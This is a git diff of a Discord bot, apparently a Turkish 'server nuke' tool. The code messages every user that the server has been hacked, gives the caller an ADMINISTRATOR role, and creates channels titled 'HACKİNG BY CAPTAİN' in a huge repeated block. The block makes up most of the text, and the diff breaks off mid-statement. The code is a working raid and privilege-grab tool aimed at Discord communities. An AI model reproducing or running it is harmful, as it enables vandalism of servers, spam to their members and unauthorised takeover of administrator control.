@@ -25,7 +25,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:"  //HERKESE DMDEN ATILAN MESAJ
+          "**BU SUNUCU HACKLENMİŞTİR **"  //HERKESE DMDEN ATILAN MESAJ
         )
       )
       .catch(console.error);
@@ -39,7 +39,7 @@ client.on("message", msg => {
       name: ".",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
+    let rol = msg.guild.roles.find(role => role.name === ".");  
     msg.member.addRole(rol);
   }
 });
@@ -64,7 +64,10417 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
-     (chan => {
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
